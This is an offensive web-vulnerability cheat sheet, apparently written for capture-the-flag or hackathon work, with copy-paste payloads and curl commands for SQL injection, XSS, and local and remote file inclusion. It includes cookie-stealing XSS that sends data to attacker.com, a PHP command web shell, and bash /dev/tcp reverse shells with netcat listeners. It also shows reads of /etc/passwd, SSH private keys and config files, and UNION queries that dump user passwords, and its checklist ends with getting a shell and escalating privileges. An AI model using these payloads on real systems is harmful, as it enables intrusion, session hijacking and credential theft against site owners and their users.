# Web Vulnerabilities

## Quick Reference & Testing Guide

### Visual Breakdown

```
┌─────────────────────────────────────────────────────────────────┐
│                   USER INPUT PARAMETER                          │
│  (e.g., ?id=1, ?search=alice, ?page=home, ?file=config)        │
└─────────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────┴─────────┐
                    │                   │
           Where does it go?      How to test?
                    │                   │
          ┌─────────┴──────────────────┘
          │
    ┌─────┴──────┬────────────────────────────────────┐
    │            │                                    │
DATABASE?     HTML PAGE?                        FILE INCLUDE?
    │            │                                    │
    │            │                              ┌─────┴────────┐
  SQLi          XSS                           Local?       Remote?
    │            │                              │              │
    ▼            ▼                              ▼              ▼
'--,1=1     <script>...      ../../../etc/   http://attacker
```

***

### Quick Vulnerability Detection

#### Test 1: SQL Injection (SQLi)

**Where to test:**

```
?id=1          ← Number fields (IDs)
?search=       ← Search boxes
?username=     ← Form fields
?category=     ← Filters
```

**Quick tests:**

| Test       | Command                            | Success Sign                       |
| ---------- | ---------------------------------- | ---------------------------------- |
| Quote test | `?id=1'`                           | SQL error appears                  |
| Boolean    | `?id=1 AND 1=1` vs `?id=1 AND 1=2` | Different responses                |
| Math       | `?id=1'=0-`                        | Page behaves differently           |
| UNION      | `?id=1 UNION SELECT 1,2,3`         | Error about columns OR see numbers |
| Time-based | `?id=1 AND SLEEP(5)`               | Page takes 5+ seconds              |

**If any test succeeds → SQLi exists!**

```bash
# Test with curl
curl "http://target/search?id=1'"                    # Look for SQL error
curl "http://target/search?id=1 AND 1=1"             # Note response
curl "http://target/search?id=1 AND 1=2"             # Different?
curl "http://target/search?id=1 UNION SELECT 1,2"    # Any response?
curl "http://target/search?id=1 AND SLEEP(5)"        # Take 5 seconds?
```

***

#### Test 2: Cross-Site Scripting (XSS)

**Where to test:**

```
?search=       ← Search boxes (reflected)
?name=         ← Greeting/profile
?comment=      ← Forum posts (stored)
?error=        ← Error messages
?redirect=     ← Redirect URLs
```

**Quick tests:**

| Test          | Command                                                            | Success Sign                   |
| ------------- | ------------------------------------------------------------------ | ------------------------------ |
| Basic tag     | `?search=<script>alert(1)</script>`                                | See `<script>` in page HTML    |
| Img tag       | `?search=<img src=x onerror=alert(1)>`                             | See `<img ... onerror` in HTML |
| SVG tag       | `?search=<svg onload=alert(1)>`                                    | See `<svg onload` in HTML      |
| Event handler | `?search="><script>alert(1)</script><"`                            | See script in HTML             |
| HTML entity   | `?search=<img src=x onerror=alert(String.fromCharCode(88,83,83))>` | Tag in HTML                    |

**If any test succeeds → XSS exists!**

```bash
# Test with curl
curl "http://target/search?q=<script>alert(1)</script>"       # Look for <script> in response
curl "http://target/search?q=<img src=x onerror=alert(1)>"    # Look for <img... in response
curl "http://target/search?q=<svg onload=alert(1)>"           # Look for <svg in response

# Check raw HTML
curl "http://target/search?q=test" | grep -i "<script\|onerror\|onload"
```

***

#### Test 3: Local File Inclusion (LFI)

**Where to test:**

```
?page=        ← Page parameter
?file=        ← File parameter
?include=     ← Include parameter
?view=        ← View parameter
?path=        ← Path parameter
?doc=         ← Document parameter
```

**Quick tests:**

| Test          | Command                                                       | Success Sign           |
| ------------- | ------------------------------------------------------------- | ---------------------- |
| Direct read   | `?page=../../../../etc/passwd`                                | See `/root:x:0:0` etc. |
| Null byte     | `?page=../../../../etc/passwd%00`                             | Read file (PHP < 5.3)  |
| PHP filter    | `?page=php://filter/convert.base64-encode/resource=index.php` | Base64 output          |
| Wrapper       | `?page=data://text/plain,test`                                | Displays "test"        |
| Log injection | `?page=../../../../var/log/apache2/access.log`                | See log entries        |

**If any test succeeds → LFI exists!**

```bash
# Test with curl
curl "http://target/index.php?page=../../../../etc/passwd"
# If you see: root:x:0:0:root:/root:/bin/bash → LFI!

curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=config.php"
# If you see base64 string → LFI with filter wrapper!

# Check what you got
curl "http://target/index.php?page=../../../../etc/passwd" | head
# Should show /etc/passwd content
```

***

#### Test 4: Remote File Inclusion (RFI)

**Where to test:**

```
?file=       ← File parameter
?page=       ← Page parameter
?url=        ← URL parameter
?include=    ← Include parameter
?lib=        ← Library parameter
```

**Quick tests:**

| Test          | Command                                      | Success Sign                  |
| ------------- | -------------------------------------------- | ----------------------------- |
| External URL  | `?file=http://attacker.com/test.txt`         | Attacker's content appears    |
| .php url      | `?file=http://attacker.com/shell.php?cmd=id` | Command output appears        |
| File protocol | `?file=file:///etc/passwd`                   | See /etc/passwd (alternative) |
| Check wrapper | Page loads normally                          | allow\_url\_include is ON     |

**If test succeeds → RFI exists!**

```bash
# On attacker machine: Create test file
echo "ATTACKER_CONTENT_12345" > /var/www/html/test.txt
# Or serve with: python3 -m http.server 80

# Test with curl
curl "http://target/page.php?file=http://attacker.com/test.txt"
# If response contains "ATTACKER_CONTENT_12345" → RFI!

curl "http://target/page.php?file=http://attacker.com/shell.php?cmd=whoami"
# If you see command output → RCE via RFI!
```

***

### Exploitation Payloads - Quick Copy-Paste

#### SQL Injection Payloads

```sql
' OR '1'='1                          ← Login bypass
' OR 1=1 --                          ← Query bypass with comment
' UNION SELECT 1,2,3 --              ← Data extraction
' UNION SELECT user(),database() --  ← Server info
' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() --  ← Table dump
' AND SLEEP(5) --                    ← Time delay test
' AND password LIKE 'a%' --          ← Blind extraction
```

**Usage:**

```bash
# In URL
curl "http://target/search?q=' OR '1'='1"

# In POST
curl -X POST http://target/login -d "user=' OR '1'='1&pass=x"

# With encoding
curl "http://target/search?q=%27%20OR%20%271%27%3D%271"
```

***

#### XSS Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<iframe onload="alert('XSS')">
<video src=x onerror="alert('XSS')">
<marquee onstart="alert('XSS')">

<!-- Stealing cookies -->
<img src=x onerror="fetch('http://attacker.com/log?c='+document.cookie)">
<script>new Image().src='http://attacker.com/log?c='+document.cookie;</script>
```

**Usage:**

```bash
# In URL
curl "http://target/search?q=<img src=x onerror=alert(1)>"

# URL encoded
curl "http://target/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"

# In POST
curl -X POST http://target/submit -d "comment=<img src=x onerror=alert(1)>"
```

***

#### LFI Payloads

```
../../../../etc/passwd                    ← Read /etc/passwd
../../../../etc/passwd%00                 ← Null byte (PHP < 5.3)
../../../../var/log/apache2/access.log    ← Read logs
../../../../proc/self/environ              ← Environment variables
php://filter/convert.base64-encode/resource=index.php  ← Read and encode PHP
php://input                                ← Read POST data
data://text/plain,<?php system('id'); ?>  ← Data wrapper
```

**Usage:**

```bash
# Direct read
curl "http://target/page.php?file=../../../../etc/passwd"

# With encoding
curl "http://target/page.php?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php"

# With null byte
curl "http://target/page.php?file=../../../../etc/passwd%00"
```

***

#### RFI Payloads

**Step 1: Create shell on attacker.com**

```php
<?php system($_GET['cmd']); ?>
```

**Step 2: Include it**

```
http://attacker.com/shell.php
http://attacker.com/shell.php?cmd=id
http://attacker.com/shell.php?cmd=whoami
```

**Usage:**

```bash
# Execute command on target via RFI
curl "http://target/page.php?file=http://attacker.com/shell.php&cmd=whoami"

# Get reverse shell
curl "http://target/page.php?file=http://attacker.com/shell.php&cmd=bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261"

# Meanwhile listen:
nc -lvnp 4444
```

***

### Decision Flow - What to Try First

```
Found vulnerable parameter!
    │
    ├─ Is it a NUMBER? (id, user_id, product_id, etc.)
    │  └─ 1. Try SQLi first
    │     2. If no response change: Try XSS
    │     3. If XSS fails: Try LFI
    │
    ├─ Is it TEXT that displays on page? (search, name, comment, etc.)
    │  └─ 1. Try XSS first
    │     2. If no tags visible: Try SQLi
    │     3. If both fail: Try Command Injection
    │
    ├─ Is it a FILE/PAGE parameter? (page, file, doc, include, etc.)
    │  └─ 1. Try LFI first (../../../../etc/passwd)
    │     2. If path traversal fails: Try RFI (http://attacker.com/...)
    │     3. If both fail: Try XSS/SQLi
    │
    └─ Is it a URL parameter? (url, next, redirect, return, etc.)
       └─ 1. Try RFI first (http://attacker.com/...)
          2. Try file:// for LFI
          3. Try SSRF (Server-Side Request Forgery)
```

***

### Testing Methodology

#### For SQLi:

```bash
# 1. Basic quote test
curl "http://target/search?id=1'"
# Look for: SQL syntax error

# 2. Boolean test
curl "http://target/search?id=1 AND 1=1"
curl "http://target/search?id=1 AND 1=2"
# Compare: Are responses different?

# 3. UNION test
curl "http://target/search?id=1 UNION SELECT NULL,NULL,NULL"
# Look for: Error about number of columns or data

# 4. If vulnerable, enumerate:
curl "http://target/search?id=1 UNION SELECT database(),user(),version()"
curl "http://target/search?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables"
curl "http://target/search?id=1 UNION SELECT username,password,3 FROM users"
```

***

#### For XSS:

```bash
# 1. Simple test
curl "http://target/search?q=<script>alert(1)</script>" | grep -i "<script>"
# If you see <script> in response: XSS exists!

# 2. If tags blocked, try event handlers
curl "http://target/search?q=<img src=x onerror=alert(1)>" | grep -i "<img"

# 3. If you have XSS, steal data
curl "http://target/search?q=<img src=x onerror='fetch(\"http://attacker.com/log?c=\"+document.cookie)'>"

# 4. Setup listener on attacker:
nc -lvnp 1234  # Listen for callback
```

***

#### For LFI:

```bash
# 1. Test path traversal
curl "http://target/page.php?file=../../../../etc/passwd" | head
# Look for: /etc/passwd content (root:x:0:0...)

# 2. If direct read fails, use wrapper
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php"
# Decode: echo "base64string" | base64 -d

# 3. Read interesting files
curl "http://target/page.php?file=../../../../var/www/config.php"
curl "http://target/page.php?file=../../../../home/user/.ssh/id_rsa"

# 4. Use for information gathering
cat /tmp/lfi_output.txt  # Analyze for credentials
```

***

#### For RFI:

```bash
# 1. Create test shell
echo "<?php echo 'RFI_WORKS'; ?>" > /tmp/test.php
# Serve: python3 -m http.server 8000

# 2. Test inclusion
curl "http://target/page.php?file=http://127.0.0.1:8000/test.php"
# Look for: "RFI_WORKS"

# 3. If works, upload command shell
echo "<?php system(\$_GET['cmd']); ?>" > /tmp/shell.php
python3 -m http.server 8000

# 4. Execute commands
curl "http://target/page.php?file=http://attacker.com:8000/shell.php?cmd=whoami"
curl "http://target/page.php?file=http://attacker.com:8000/shell.php?cmd=id"
curl "http://target/page.php?file=http://attacker.com:8000/shell.php?cmd=cat%20/etc/passwd"

# 5. Get interactive shell
curl "http://target/page.php?file=http://attacker.com:8000/shell.php?cmd=bash+-i+>%26+/dev/tcp/attacker.com/4444+0>%261"
# Meanwhile:
nc -lvnp 4444
```

***

### Common Misconceptions

```
❌ WRONG: "If I don't see an error, there's no SQLi"
✅ RIGHT: Use boolean-based and time-based blind SQLi

❌ WRONG: "Script tags are the only XSS"
✅ RIGHT: Event handlers, img, svg, body, input, iframe, marquee, etc.

❌ WRONG: "LFI only reads .php files"
✅ RIGHT: LFI reads ANY file (txt, config, images, source code, etc.)

❌ WRONG: "RFI needs allow_url_include enabled"
✅ RIGHT: Some configurations might allow it despite disabled setting

❌ WRONG: "If parameter has no input validation, it's vulnerable"
✅ RIGHT: Need to test WHERE the input is used (DB, HTML, File, etc.)
```

***

### Parameter Cheat Sheet

| Parameter Name                 | Likely Type       | Try First |
| ------------------------------ | ----------------- | --------- |
| id, uid, user\_id, product\_id | SQLi              | SQLi      |
| search, q, query, keyword      | XSS/SQLi          | XSS       |
| page, file, doc, include       | LFI               | LFI       |
| url, next, return, redirect    | RFI/SSRF          | RFI       |
| username, email, name          | SQLi/XSS          | SQLi      |
| comment, text, message, bio    | XSS (Stored)      | XSS       |
| category, filter, sort         | SQLi              | SQLi      |
| template, lang, theme          | LFI/RFI           | LFI       |
| action, cmd, command           | Command Injection | Cmd Inj   |

***

### Hackathon Quick Checklist

```
For every web app found:

□ Enumerate all parameters
  □ GET parameters (?key=value)
  □ POST parameters (form data)
  □ Headers (User-Agent, Referer, Cookie)
  □ Hidden fields

□ For each parameter test:
  □ SQLi (if number/data)
  □ XSS (if displays on page)
  □ LFI (if file-related)
  □ RFI (if URL-related)
  □ Command Injection (if system operations)

□ If vulnerable:
  □ Determine type and severity
  □ Extract data / Execute commands
  □ Get reverse shell if possible
  □ Escalate privileges
  □ Find flag

□ If stuck:
  □ Move to next parameter
  □ Move to next machine
  □ Don't spend >30 minutes on one vector
```
